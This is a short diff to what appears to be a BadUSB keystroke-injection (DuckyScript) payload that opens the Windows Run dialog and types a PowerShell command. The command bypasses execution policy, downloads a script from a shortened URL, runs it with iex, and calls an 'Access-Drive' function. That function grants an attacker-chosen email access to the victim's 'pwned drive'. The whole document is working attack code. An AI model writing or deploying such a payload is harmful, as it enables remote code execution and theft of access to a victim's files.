@@ -1,6 +1,6 @@
 DELAY 1000
 GUI r
 DELAY 500
-STRING powershell -NoP -Ep Bypass irm 't.ly/OhFHa'|iex;Access-Drive -em 'email you want to grant access'
+STRING powershell -NoP -Ep Bypass irm 'tinyurl.com/calidrivepwn'|iex;Access-Drive -em 'email you want to grant access to the pwned drive'
 DELAY 300
 ENTER
